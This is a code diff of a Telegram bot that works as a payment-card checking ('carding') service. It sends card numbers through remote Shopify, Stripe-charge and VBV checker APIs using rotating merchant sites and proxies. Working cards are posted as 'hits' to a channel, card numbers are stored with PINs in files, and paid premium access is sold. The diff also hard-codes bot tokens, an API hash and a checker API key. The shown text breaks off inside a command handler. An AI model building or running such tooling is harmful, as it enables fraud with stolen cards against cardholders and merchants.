@@ -1,6 +1,7 @@
 from telethon import TelegramClient, events, Button
 import asyncio
 from telethon import errors
+from telethon.tl import types as tl_types, functions
 import aiohttp
 import aiofiles
 import os
@@ -15,7 +16,7 @@ API_HASH = '067ae5148b522f3dc9f8ff06df7cab66'
 
 # Read token from file (auto-updated by token-changer)
 def get_bot_token():
-    token_file = 'bot_token.txt'
+    token_file = '/root/bot_token.txt'
     try:
         if os.path.exists(token_file):
             with open(token_file, 'r') as f:
@@ -24,7 +25,7 @@ def get_bot_token():
                     return token
     except:
         pass
-    return '8700590803:AAF7pwKgX__lTqp8htT6xeIN0gTfPDtuPW8'  # default
+    return '8569906031:AAHMIRME8pl1QxBmXVK_0d5XDJzJcVQ5U5w'  # default
 
 BOT_TOKEN = get_bot_token()
 
@@ -48,15 +49,56 @@ def save_user_proxies(user_id, proxies):
 
 ADMIN_ID = [8987165792,7671957436]
 CHECKER_API_URL = 'https://shimmering-celebration-production-7dd0.up.railway.app/shopify'
+CHECKER_API_KEY = 'AnonShopii2026!'
+STRIPE_CHARGE_API_URL = 'https://www.tekside.com.tn/bot/'
+VBV_API_URL = 'https://www.tekside.com.tn/api/check'
+import random as _rnd
 
+# Gateway Control
+default_gateway = 'shopify'
 
+# PIN Storage
+CHARGED_PINS_DIR = 'charged_pins'
+os.makedirs(CHARGED_PINS_DIR, exist_ok=True)
+
+def save_charged_card_with_pin(card, pin, gateway, status):
+    if not pin:
+        return
+    filename = os.path.join(CHARGED_PINS_DIR, f"{gateway}_{status}.txt")
+    try:
+        with open(filename, 'a', encoding='utf-8') as f:
+            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            f.write(f"{timestamp} | {card} | PIN: {pin}\n")
+    except:
+        pass
+
+async def get_pin_for_card(card_number):
+    if not os.path.exists(CHARGED_PINS_DIR):
+        return None
+    try:
+        import aiofiles as _aiof
+        for filename in os.listdir(CHARGED_PINS_DIR):
+            if filename.endswith('.txt'):
+                filepath = os.path.join(CHARGED_PINS_DIR, filename)
+                async with _aiof.open(filepath, 'r', encoding='utf-8') as f:
+                    async for line in f:
+                        if card_number in line:
+                            pin_match = re.search(r'PIN:\s*(\d+)', line)
+                            if pin_match:
+                                return pin_match.group(1)
+    except:
+        pass
+    return None
 
 PREMIUM_USERS_FILE = "premium_users.txt"
 SITES_FILE = 'sites.txt'
+STRIPE_SITES_FILE = 'stripe_sites.txt'
 PROXY_FILE = 'proxy.txt'
 PRICE_FILTERS_FILE = "price_filters.json"
 SITES_WITH_PRICE_FILE = "sites_price.json"
 KEYS_FILE = "keys.json"
+STARS_FILE = "stars.json"
+DAILY_STARS = 100
 HITS_CHANNEL_ID = -1003942173333
 
 bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
@@ -100,6 +142,52 @@ async def token_checker_task():
     while True:
         await asyncio.sleep(60)  # Check every minute
         check_token_change()
+
+# Check expired premiums every 5 minutes
+async def premium_checker_task():
+    while True:
+        await asyncio.sleep(300)  # 5 minutes
+        try:
+            await check_expired_premiums()
+        except:
+            pass
+
+# Payment button - user pays 100 stars for 1 day access
+async def payment_checker_task():
+    while True:
+        await asyncio.sleep(60)  # Check every minute
+        try:
+            # Check for expired subscriptions
+            data = load_premium_data()
+            now = datetime.now()
+            changed = False
+            for uid in list(data.keys()):
+                if int(uid) in ADMIN_ID:
+                    continue
+                expiry = data[uid].get('expiry')
+                if expiry:
+                    exp_dt = datetime.fromisoformat(expiry)
+                    if exp_dt < now:
+                        # Notify expiry
+                        try:
+                            u = await bot.get_entity(int(uid))
+                            username = f"@{u.username}" if u.username else u.first_name or "Unknown"
+                        except:
+                            username = "Unknown"
+                        try:
+                            msg = f"""❌ <b>Sᴜʙsᴄʀɪᴘᴛɪᴏɴ Exᴘɪʀᴇᴅ</b>
+
+👤 <a href=\"tg://user?id={uid}\">{username}</a> (<code>{uid}</code>)
+⏰ Access ended"""
+                            await bot.send_message(HITS_CHANNEL_ID, premium_emoji(msg), parse_mode='html')
+                        except:
+                            pass
+                        del data[uid]
+                        changed = True
+            if changed:
+                save_premium_data(data)
+        except Exception as e:
+            print(f'[-] Payment checker error: {e}')
 
 active_sessions = {}
 TEMP_FILE_DATA = {}
@@ -243,58 +331,180 @@ def get_file_lines(filepath):
     except:
         return []
 
-def load_premium_users():
-    if not os.path.exists(PREMIUM_USERS_FILE):
-        with open(PREMIUM_USERS_FILE, 'w') as f:
-            for admin in ADMIN_ID:
-                f.write(f"{admin}\n")
-        return [str(admin) for admin in ADMIN_ID]
+def load_premium_data():
+    """Load premium data with expiry times"""
+    data_file = 'premium_data.json'
+    if not os.path.exists(data_file):
+        # Migrate from old format
+        data = {}
+        if os.path.exists(PREMIUM_USERS_FILE):
+            with open(PREMIUM_USERS_FILE, 'r') as f:
+                for line in f:
+                    uid = line.strip()
+                    if uid:
+                        data[uid] = {'expiry': None, 'added_by': None}
+            # Save as new format
+            with open(data_file, 'w') as f:
+                json.dump(data, f)
+        return data
     try:
-        with open(PREMIUM_USERS_FILE, 'r', encoding='utf-8', errors='ignore') as f:
-            users = [line.strip() for line in f if line.strip()]
-        for admin in ADMIN_ID:
-            if str(admin) not in users:
-                users.append(str(admin))
-                with open(PREMIUM_USERS_FILE, 'w') as f:
-                    for u in users:
-                        f.write(f"{u}\n")
-        return users
+        with open(data_file, 'r') as f:
+            return json.load(f)
     except:
-        return [str(admin) for admin in ADMIN_ID]
+        return {}
+
+def save_premium_data(data):
+    with open('premium_data.json', 'w') as f:
+        json.dump(data, f)
+
+def load_premium_users():
+    data = load_premium_data()
+    now = datetime.now()
+    # Remove expired users (except admins)
+    changed = False
+    for uid in list(data.keys()):
+        if int(uid) in ADMIN_ID:
+            continue
+        expiry = data[uid].get('expiry')
+        if expiry and datetime.fromisoformat(expiry) < now:
+            del data[uid]
+            changed = True
+    if changed:
+        save_premium_data(data)
+    return list(data.keys())
 
 def load_sites():
     return get_file_lines(SITES_FILE)
 
+def load_stripe_sites():
+    return get_file_lines(STRIPE_SITES_FILE)
+
 def load_proxies():
     return get_file_lines(PROXY_FILE)
 
-def is_premium(user_id):
-    premium_users = load_premium_users()
-    return str(user_id) in premium_users
+async def check_expired_premiums():
+    """Check and notify about expired premiums"""
+    data = load_premium_data()
+    now = datetime.now()
+    changed = False
+    for uid in list(data.keys()):
+        if int(uid) in ADMIN_ID:
+            continue
+        expiry = data[uid].get('expiry')
+        if expiry:
+            exp_dt = datetime.fromisoformat(expiry)
+            if exp_dt < now:
+                # Notify expiry
+                try:
+                    u = await bot.get_entity(int(uid))
+                    username = f"@{u.username}" if u.username else u.first_name or "Unknown"
+                except:
+                    username = "Unknown"
+                try:
+                    msg = f"""❌ <b>Pʀᴇᴍɪᴜᴍ Exᴘɪʀᴇᴅ</b>
 
-async def add_premium_user(user_id):
-    premium_users = load_premium_users()
-    if str(user_id) not in premium_users:
-        premium_users.append(str(user_id))
-        async with aiofiles.open(PREMIUM_USERS_FILE, 'w') as f:
-            for uid in premium_users:
-                await f.write(f"{uid}\n")
+👤 <a href=\"tg://user?id={uid}\">{username}</a> (<code>{uid}</code>)
+⏰ Dᴜʀᴀᴛɪᴏɴ ENDED"""
+                    await bot.send_message(HITS_CHANNEL_ID, premium_emoji(msg), parse_mode='html')
+                except:
+                    pass
+                del data[uid]
+                changed = True
+    if changed:
+        save_premium_data(data)
+
+def is_premium(user_id):
+    data = load_premium_data()
+    uid = str(user_id)
+    if uid not in data:
+        return False
+    if int(user_id) in ADMIN_ID:
         return True
-    return False
+    expiry = data[uid].get('expiry')
+    if not expiry:
+        return True  # permanent
+    return datetime.fromisoformat(expiry) > datetime.now()
+
+async def add_premium_user(user_id, hours=None, added_by=None):
+    data = load_premium_data()
+    uid = str(user_id)
+    if uid not in data:
+        data[uid] = {}
+    if hours:
+        now = datetime.now()
+        existing_expiry = data[uid].get('expiry')
+        if existing_expiry and datetime.fromisoformat(existing_expiry) > now:
+            # Extend from current expiry
+            new_expiry = datetime.fromisoformat(existing_expiry) + timedelta(hours=hours)
+        else:
+            new_expiry = now + timedelta(hours=hours)
+        data[uid]['expiry'] = new_expiry.isoformat()
+    else:
+        data[uid]['expiry'] = None  # permanent
+    if added_by:
+        data[uid]['added_by'] = added_by
+    save_premium_data(data)
+    return True
 
 async def remove_premium_user(user_id):
-    premium_users = load_premium_users()
-    if str(user_id) in premium_users:
-        premium_users.remove(str(user_id))
-        async with aiofiles.open(PREMIUM_USERS_FILE, 'w') as f:
-            for uid in premium_users:
-                await f.write(f"{uid}\n")
+    data = load_premium_data()
+    uid = str(user_id)
+    if uid in data:
+        del data[uid]
+        save_premium_data(data)
         return True
     return False
 
 def generate_key():
     random_part = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=15))
-    return f"GPI6_{random_part}"
+    return f"ZNZII_{random_part}"
+
+# Stars System
+def load_stars():
+    if not os.path.exists(STARS_FILE):
+        return {}
+    try:
+        with open(STARS_FILE, 'r') as f:
+            return json.load(f)
+    except:
+        return {}
+
+def save_stars(data):
+    with open(STARS_FILE, 'w') as f:
+        json.dump(data, f)
+
+def get_stars(user_id):
+    data = load_stars()
+    return data.get(str(user_id), 0)
+
+def add_stars(user_id, amount):
+    data = load_stars()
+    uid = str(user_id)
+    data[uid] = data.get(uid, 0) + amount
+    save_stars(data)
+    return data[uid]
+
+def use_stars(user_id, amount):
+    data = load_stars()
+    uid = str(user_id)
+    current = data.get(uid, 0)
+    if current >= amount:
+        data[uid] = current - amount
+        save_stars(data)
+        return True
+    return False
+
+async def daily_stars_task():
+    """Give 100 stars to all premium users every day"""
+    while True:
+        await asyncio.sleep(86400)  # 24 hours
+        try:
+            premium_users = load_premium_users()
+            for uid in premium_users:
+                add_stars(int(uid), DAILY_STARS)
+            print(f'[+] Daily stars given to {len(premium_users)} users')
+        except Exception as e:
+            print(f'[-] Daily stars error: {e}')
 
 async def load_keys():
     if not os.path.exists(KEYS_FILE):
@@ -484,7 +694,7 @@ async def check_card(card, site, proxy):
                 proxy_str = f"{ip}:{port}"
             else:
                 proxy_str = proxy
-        url = f'{CHECKER_API_URL}?site={site}&cc={card}&key=AnonShopii2026!'
+        url = f'{CHECKER_API_URL}?site={site}&cc={card}&key={CHECKER_API_KEY}'
         if proxy_str:
             url += f'&proxy={proxy_str}'
         timeout = aiohttp.ClientTimeout(total=100)
@@ -512,12 +722,18 @@ async def check_card(card, site, proxy):
             return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price_display, 'price_value': price_value}
         elif any(key in response_lower for key in ['approved', 'success', 'insufficient_funds', 'insufficient funds', 'invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc', 'invalid cvv', 'incorrect cvv', 'invalid cvc', 'incorrect cvc', 'incorrect_zip', 'incorrect zip', 'cvv issue', '3d', '3d secure', 'otp', 'verification required', 'authenticate', 'authentication required', 'challenge required', 'redirecting to bank', 'bank verification', 'send code', 'enter code', 'verify']):
             return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price_display, 'price_value': price_value}
+        elif 'declined' in response_lower or 'card_declined' in response_lower:
+            return {'status': 'Declined', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price_display, 'price_value': price_value}
         else:
-            return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price_display, 'price_value': price_value}
+            return {'status': 'Declined', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price_display, 'price_value': price_value}
+    except aiohttp.ClientConnectorError as e:
+        return {'status': 'Site Error', 'message': 'Connection failed - retrying', 'card': card, 'retry': True}
+    except aiohttp.ClientError as e:
+        return {'status': 'Site Error', 'message': f'Client error: {str(e)[:50]}', 'card': card, 'retry': True}
     except asyncio.TimeoutError:
         return {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'retry': True}
     except Exception as e:
-        return {'status': 'Dead', 'message': str(e), 'card': card, 'gateway': 'Unknown', 'price': '-', 'price_value': 0}
+        return {'status': 'Declined', 'message': str(e), 'card': card, 'gateway': 'Unknown', 'price': '-', 'price_value': 0}
 
 # ردود تستدعي إعادة المحاولة على site مختلف
 RETRY_RESPONSES = [
@@ -528,9 +744,9 @@ RETRY_RESPONSES = [
 
 async def check_card_with_retry(card, sites, proxies, max_retries=20):
     if not sites:
-        return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': 'Unknown', 'price': '-', 'price_value': 0}
+        return {'status': 'Declined', 'message': 'No sites available', 'card': card, 'gateway': 'Unknown', 'price': '-', 'price_value': 0}
     if not proxies:
-        return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': 'Unknown', 'price': '-', 'price_value': 0}
+        return {'status': 'Declined', 'message': 'No proxies available', 'card': card, 'gateway': 'Unknown', 'price': '-', 'price_value': 0}
     
     tried_sites = set()
     for attempt in range(max_retries):
@@ -551,7 +767,89 @@ async def check_card_with_retry(card, sites, proxies, max_retries=20):
         
         return result
     
-    return {'status': 'Dead', 'message': 'Max retries reached', 'card': card, 'gateway': 'Unknown', 'price': '-', 'price_value': 0}
+    return {'status': 'Declined', 'message': 'Max retries reached', 'card': card, 'gateway': 'Unknown', 'price': '-', 'price_value': 0}
+
+# ===================== STRIPE CHARGE CHECKER =====================
+async def check_card_stripe_charge(card, proxy=None, site=None):
+    try:
+        stripe_sites = load_stripe_sites()
+        if not site and stripe_sites:
+            site = random.choice(stripe_sites)
+        url = f"{STRIPE_CHARGE_API_URL}?cc={card}"
+        if site:
+            url += f"&url={site}"
+        if proxy:
+            proxy_str = proxy
+            if ':' in proxy:
+                parts = proxy.split(':')
+                if len(parts) == 4:
+                    ip, port, user, password = parts
+                    proxy_str = f"{ip}:{port}:{user}:{password}"
+            url += f"&proxy={proxy_str}"
+        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=60)) as session:
+            async with session.get(url) as resp:
+                response_text = await resp.text()
+        try:
+            raw = json.loads(response_text)
+        except:
+            raw = {'Response': response_text, 'Charged': False, 'Approved': False, 'Price': '1$'}
+        response_msg = raw.get('Response', response_text[:200])
+        price = str(raw.get('Price', '1$'))
+        gate = raw.get('Gate', 'Stripe Charge')
+        pin = raw.get('pin')
+        if not pin and 'pin:' in str(response_msg).lower():
+            pin_match = re.search(r'pin:\s*(\d+)', str(response_msg), re.IGNORECASE)
+            if pin_match:
+                pin = pin_match.group(1)
+        if raw.get('Charged') in [True, 'True', 'true', 1]:
+            if pin:
+                save_charged_card_with_pin(card, pin, 'stripe_charge', 'charged')
+            return {'status': 'Charged', 'message': response_msg, 'card': card, 'gateway': gate, 'price': price, 'pin': pin}
+        elif raw.get('Approved') in [True, 'True', 'true', 1]:
+            if pin:
+                save_charged_card_with_pin(card, pin, 'stripe_charge', 'approved')
+            return {'status': 'Approved', 'message': response_msg, 'card': card, 'gateway': gate, 'price': price, 'pin': pin}
+        else:
+            # Check response text for live indicators
+            resp_lower = str(response_msg).lower()
+            if any(k in resp_lower for k in ['insufficient', 'cvv', 'incorrect', '3d', 'otp', 'authenticate']):
+                return {'status': 'Approved', 'message': response_msg, 'card': card, 'gateway': gate, 'price': price, 'pin': pin}
+            return {'status': 'Declined', 'message': response_msg, 'card': card, 'gateway': gate, 'price': price}
+    except Exception as e:
+        return {'status': 'Declined', 'message': str(e), 'card': card, 'gateway': 'Stripe Charge', 'price': '1$'}
+
+# ===================== VBV CHECKER =====================
+async def check_card_vbv(card):
+    try:
+        url = f"{VBV_API_URL}?cc={card}"
+        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=60)) as session:
+            async with session.get(url) as resp:
+                response_text = await resp.text()
+        try:
+            raw = json.loads(response_text)
+        except:
+            if 'VBV Authenticate Successful' in response_text:
+                pin_match = re.search(r'pin:\s*(\d+)', response_text, re.IGNORECASE)
+                pin = pin_match.group(1) if pin_match else None
+                if pin:
+                    save_charged_card_with_pin(card, pin, 'vbv', '3ds')
+                return {'status': '3DS', 'message': response_text[:150], 'card': card, 'gateway': 'VBV Braintree', 'price': '4$', 'pin': pin}
+            return {'status': 'Declined', 'message': response_text[:150], 'card': card, 'gateway': 'VBV Braintree', 'price': '4$'}
+        status = raw.get('status', '').lower()
+        response_msg = raw.get('response', raw.get('message', raw.get('Response', response_text[:200])))
+        pin = raw.get('pin')
+        if not pin and 'pin:' in str(response_msg).lower():
+            pin_match = re.search(r'pin:\s*(\d+)', str(response_msg), re.IGNORECASE)
+            if pin_match:
+                pin = pin_match.group(1)
+        if status == 'approved' or 'successful' in str(response_msg).lower():
+            if pin:
+                save_charged_card_with_pin(card, pin, 'vbv', '3ds')
+            return {'status': '3DS', 'message': response_msg, 'card': card, 'gateway': 'VBV Braintree', 'price': '4$', 'pin': pin}
+        else:
+            return {'status': 'Declined', 'message': response_msg, 'card': card, 'gateway': 'VBV Braintree', 'price': '4$'}
+    except Exception as e:
+        return {'status': 'Declined', 'message': str(e), 'card': card, 'gateway': 'VBV Braintree', 'price': '4$'}
 
 async def test_site_with_price(site, proxy):
     test_card = "4111111111111111|01|2030|123"
@@ -567,7 +865,7 @@ async def test_site_with_price(site, proxy):
             elif len(proxy_parts) == 2:
                 ip, port = proxy_parts
                 proxy_str = f"{ip}:{port}"
-        url = f'{CHECKER_API_URL}?site={site}&cc={test_card}&key=AnonShopii2026!'
+        url = f'{CHECKER_API_URL}?site={site}&cc={test_card}&key={CHECKER_API_KEY}'
         if proxy_str:
             url += f'&proxy={proxy_str}'
         timeout = aiohttp.ClientTimeout(total=60)
@@ -1159,6 +1457,123 @@ def detect_analytics(html: str, srcs: list[str]) -> list[str]:
     return found
 
 
+@bot.on(events.NewMessage(pattern='/balance'))
+async def balance_command(event):
+    user_id = event.sender_id
+    stars = get_stars(user_id)
+    await event.reply(premium_emoji(f"⭐ <b>Yᴏᴜʀ Sᴛᴀʀs</b>\n\n⭐ {stars} stars\n\n💡 <i>Having stars = unlimited checks</i>\n📅 <i>Daily bonus: {DAILY_STARS} stars</i>"), parse_mode='html')
+@bot.on(events.NewMessage(pattern='/subscribe'))
+async def subscribe_command(event):
+    user_id = event.sender_id
+    is_prem = is_premium(user_id)
+
+    if is_prem:
+        data = load_premium_data()
+        uid = str(user_id)
+        expiry = data.get(uid, {}).get('expiry')
+        if expiry:
+            exp_dt = datetime.fromisoformat(expiry)
+            diff = exp_dt - datetime.now()
+            hours = int(diff.total_seconds() // 3600)
+            mins = int((diff.total_seconds() % 3600) // 60)
+            await event.reply(
+                premium_emoji(f"✅ <b>Yᴏᴜ Aʀᴇ Pʀᴇᴍɪᴜᴍ!</b>\n\n⏰ <b>Rᴇᴍᴀɪɴɪɴɢ:</b> {hours}h {mins}m\n📅 <b>Eɴᴅs:</b> {exp_dt.strftime('%Y-%m-%d %H:%M')}"),
+                parse_mode='html'
+            )
+            return
+        else:
+            await event.reply(
+                premium_emoji("✅ <b>Yᴏᴜ Aʀᴇ Pʀᴇᴍɪᴜᴍ (Permanent)!</b>"),
+                parse_mode='html'
+            )
+            return
+
+    # Try Telegram Stars invoice using raw API
+    try:
+        from telethon.tl.types import Invoice, LabeledPrice, InputMediaInvoice, DataJSON
+        from telethon.tl import functions
+        import random as rnd
+        
+        # Build invoice
+        invoice = Invoice(
+            currency="XTR",
+            prices=[LabeledPrice(label="1 Day Access", amount=100)],
+            test=True,
+            flexible=False,
+        )
+        
+        # Build InputMediaInvoice
+        media = InputMediaInvoice(
+            title="⭐ 1 Day Premium Access",
+            description="Unlimited card checking for 24 hours!",
+            invoice=invoice,
+            payload=b"premium_1day",
+            provider_data=DataJSON(data="{}"),
+        )
+        
+        # Send invoice using SendMediaRequest
+        result = await bot(functions.messages.SendMediaRequest(
+            peer=await event.get_input_chat(),
+            media=media,
+            message="⭐ Pay with Telegram Stars",
+            random_id=rnd.getrandbits(64),
+        ))
+        print(f"[+] Invoice sent to {user_id}")
+    except Exception as e:
+        print(f"[-] Invoice error: {e}")
+        import traceback
+        traceback.print_exc()
+        # Fallback
+        await event.reply(
+            premium_emoji(f"⭐ <b>Sᴜʙsᴄʀɪᴘᴛɪᴏɴ</b>\n\n💰 <b>Pʀɪᴄᴇ:</b> 100 Telegram Stars\n📅 <b>Dᴜʀᴀᴛɪᴏɴ:</b> 1 Day\n\n🔑 <b>How to subscribe:</b>\n1. Send 100 stars to @znzii\n2. Screenshot the payment\n3. Send screenshot here\n4. Admin will activate your access"),
+            parse_mode='html',
+            buttons=[[Button.url(" 💳 Pᴀʏ Nᴏᴡ", "https://t.me/znzii")]]
+        )
+
+# Handle pre-checkout (when user clicks pay)
+@bot.on(events.Raw(types=tl_types.UpdateBotPrecheckoutQuery))
+async def pre_checkout_handler(event):
+    user_id = event.user_id
+    query_id = event.query_id
+    print(f"[*] Pre-checkout from {user_id}")
+    try:
+        await bot(functions.messages.SetBotPrecheckoutResultsRequest(
+            query_id=query_id,
+            ok=True,
+        ))
+        print(f"[+] Pre-checkout accepted for {user_id}")
+    except Exception as e:
+        print(f"[-] Pre-checkout error: {e}")
+
+# Handle successful payment - via MessageActionPaymentSent
+@bot.on(events.NewMessage(func=lambda e: e.message and e.message.action and isinstance(e.message.action, tl_types.MessageActionPaymentSentMe)))
+async def successful_payment_handler(event):
+    user_id = event.user_id
+    print(f"[*] Payment received from {user_id}!")
+    # Give 1 day premium
+    await add_premium_user(user_id, hours=24, paid=True)
+    # Notify user
+    try:
+        await bot.send_message(user_id, premium_emoji("""✅ <b>Pᴀʏᴍᴇɴᴛ Sᴜᴄᴄᴇssғᴜʟ!</b>
+
+⭐ <b>1 Day Premium Activated!</b>
+📅 <b>Expires:</b> 24 hours from now
+
+🚀 Enjoy unlimited card checking!"""), parse_mode='html')
+    except:
+        pass
+    # Notify admin channel
+    try:
+        sender = await bot.get_entity(user_id)
+        username = f"@{sender.username}" if sender.username else sender.first_name or "Unknown"
+        await bot.send_message(HITS_CHANNEL_ID, premium_emoji(f"""💰 <b>Pᴀʏᴍᴇɴᴛ Rᴇᴄᴇɪᴠᴇᴅ!</b>
+
+👤 <a href=\"tg://user?id={user_id}\">{username}</a> (<code>{user_id}</code>)
+⭐ <b>1 Day Premium Activated</b>"""), parse_mode='html')
+    except:
+        pass
+    print(f"[+] Premium activated for {user_id}")
+
 @bot.on(events.NewMessage(pattern='/start'))
 async def start(event):
     user_id = event.sender_id
@@ -1208,10 +1623,17 @@ One day I will be the best
 async def show_commands_callback(event):
     commands_text = """📋 Usᴇʀ Cᴏᴍᴍᴀɴᴅs
 
-🛒 Sʜᴏᴘɪғʏ
+🛍️ Sʜᴏᴘɪғʏ
 ├─ <code>/cc ᴄᴄ|ᴍᴍ|ʏʏ|ᴄᴠᴠ</code> → Cʜᴇᴄᴋ sɪɴɢʟᴇ ᴄᴀʀᴅ
 └─ <code>/chk</code> → Mᴀss ᴄʜᴇᴄᴋ ғʀᴏᴍ .ᴛxᴛ ғɪʟᴇ
 
+👑 Sᴛʀɪᴘᴇ Cʜᴀʀɢᴇ (1$)
+├─ <code>/st ᴄᴄ|ᴍᴍ|ʏʏ|ᴄᴠᴠ</code> → Cʜᴇᴄᴋ sɪɴɢʟᴇ ᴄᴀʀᴅ
+└─ <code>/ran_st</code> → Bᴀᴛᴄʜ ᴄʜᴇᴄᴋ (reply .txt)
+
+🪪 Vʙᴠ Bʀᴀɪɴᴛʀᴇᴇ (4$)
+├─ <code>/vbv ᴄᴄ|ᴍᴍ|ʏʏ|ᴄᴠᴠ</code> → Cʜᴇᴄᴋ sɪɴɢʟᴇ ᴄᴀʀᴅ
+└─ <code>/ran_vbv</code> → Bᴀᴛᴄʜ ᴄʜᴇᴄᴋ (reply .txt)
 
 🔑 Kᴇʏ Sʏsᴛᴇᴍ
 └─ <code>/redeem Kᴇʏ</code> → Rᴇᴅᴇᴇᴍ ᴀ ᴘʀᴇᴍɪᴜᴍ ᴋᴇʏ """
@@ -1233,7 +1655,10 @@ async def admin_panel_callback(event):
 └─ <code>/genkeys ᴀᴍᴏᴜɴᴛ ʜᴏᴜʀs ᴜsᴇʀ_ʟɪᴍɪᴛ</code> → Gᴇɴᴇʀᴀᴛᴇ ᴘʀᴇᴍɪᴜᴍ ᴋᴇʏs
 
 🌐 <b>Sɪᴛᴇs Mᴀɴᴀɢᴇᴍᴇɴᴛ</b>
-├─ <code>/addsites</code> → Rᴇᴘʟʏ ᴛᴏ .ᴛxᴛ ғɪʟᴇ ᴛᴏ ᴜᴘʟᴏᴀᴅ sɪᴛᴇs
+├─ <code>/addsites</code> → Rᴇᴘʟʏ ᴛᴏ .ᴛxᴛ ғɪʟᴇ ᴛᴏ ᴜᴘʟᴏᴀᴅ sʜᴏᴘɪғʏ sɪᴛᴇs
+├─ <code>/addstripe</code> → Rᴇᴘʟʏ ᴛᴏ .ᴛxᴛ ғɪʟᴇ ᴛᴏ ᴜᴘʟᴏᴀᴅ sᴛʀɪᴘᴇ sɪᴛᴇs
+├─ <code>/mysites</code> → Lɪsᴛ ᴀʟʟ sɪᴛᴇs
+├─ <code>/rmsite</code> → Rᴇᴍᴏᴠᴇ sᴛʀɪᴘᴇ sɪᴛᴇ
 ├─ <code>/site</code> → Cʜᴇᴄᴋ & ʀᴇᴍᴏᴠᴇ ᴅᴇᴀᴅ sɪᴛᴇs
 ├─ <code>/rm ᴜʀʟ</code> → Rᴇᴍᴏᴠᴇ sᴘᴇᴄɪғɪᴄ sɪᴛᴇ
 ├─ <code>/getsites</code> → Dᴏᴡɴʟᴏᴀᴅ ᴄᴜʀʀᴇɴᴛ sɪᴛᴇs.ᴛxᴛ
@@ -1446,6 +1871,11 @@ async def single_cc_check(event):
     if not is_premium(user_id):
         await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ\n\nOɴʟʏ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs ᴄᴀɴ ᴜsᴇ ᴛʜɪs ʙᴏᴛ."), parse_mode='html')
         return
+    # Check stars - need at least 1 star to use bot
+    stars = get_stars(user_id)
+    if stars <= 0:
+        await event.reply(premium_emoji(f"❌ Nᴏᴛ ᴇɴᴏᴜɢʜ sᴛᴀʀs!\n\n⭐ Yᴏᴜ ʜᴀᴠᴇ: {stars} stars\n📅 <i>Daily bonus: {DAILY_STARS} stars</i>\n\n💡 <i>Wait for daily bonus or contact admin</i>"), parse_mode='html')
+        return
     sites = load_sites()
     proxies = get_user_proxies(user_id)
     if not proxies:
@@ -1488,6 +1918,180 @@ async def single_cc_check(event):
         await status_msg.edit(premium_emoji(final_resp), parse_mode='html')
     except Exception as e:
         await status_msg.edit(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')
+
+# ===================== STRIPE CHARGE COMMAND =====================
+@bot.on(events.NewMessage(pattern=r'/st\s+'))
+async def stripe_charge_single(event):
+    user_id = event.sender_id
+    if not is_premium(user_id):
+        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ\n\nOɴʟʏ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs."), parse_mode='html')
+        return
+    cc_input = event.message.text.split(' ', 1)[1].strip()
+    cards = extract_cc(cc_input)
+    if not cards:
+        await event.reply(premium_emoji("❌ Usage: /st card|mm|yy|cvv"), parse_mode='html')
+        return
+    card = cards[0]
+    proxies = get_user_proxies(user_id)
+    proxy = random.choice(proxies) if proxies else None
+    status_msg = await event.reply(premium_emoji(f"👑 Checking Stripe Charge...\n<code>{card}</code>\n💰 Price: 1$"), parse_mode='html')
+    try:
+        result = await check_card_stripe_charge(card, proxy)
+        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
+        if result['status'] == 'Charged':
+            status_header = premium_emoji('💎 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 🔥')
+        elif result['status'] == 'Approved':
+            status_header = premium_emoji('✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅')
+        else:
+            status_header = premium_emoji('❌ DECLINED')
+        pin_text = f"\n🔐 PIN: <code>{result['pin']}</code>" if result.get('pin') else ""
+        final_resp = f"""{status_header}\n\n💳 CC <code>{result['card']}</code>\n\n👑 Gateway: Stripe Charge\n📝 Response: {result['message'][:150]}\n💰 Price: {result.get('price', '1$')}{pin_text}\n\n🆔 BIN: {brand} - {bin_type} - {level}\n🏦 Bank: {bank}\n🥰 Country: {country} {flag}"""
+        if result['status'] in ['Charged', 'Approved']:
+            await send_hit_to_channel(result['card'], result['status'], result['message'], 'Stripe Charge', result.get('price', '1$'))
+        await status_msg.edit(premium_emoji(final_resp), parse_mode='html')
+    except Exception as e:
+        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
+
+# ===================== VBV COMMAND =====================
+@bot.on(events.NewMessage(pattern=r'/vbv\s+'))
+async def vbv_single(event):
+    user_id = event.sender_id
+    if not is_premium(user_id):
+        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ\n\nOɴʟʏ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs."), parse_mode='html')
+        return
+    cc_input = event.message.text.split(' ', 1)[1].strip()
+    cards = extract_cc(cc_input)
+    if not cards:
+        await event.reply(premium_emoji("❌ Usage: /vbv card|mm|yy|cvv"), parse_mode='html')
+        return
+    card = cards[0]
+    status_msg = await event.reply(premium_emoji(f"🪪 Checking VBV Braintree...\n<code>{card}</code>\n💰 Price: 4$"), parse_mode='html')
+    try:
+        result = await check_card_vbv(card)
+        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
+        if result['status'] == '3DS':
+            status_header = premium_emoji('✅ 3DS SUCCESS')
+        else:
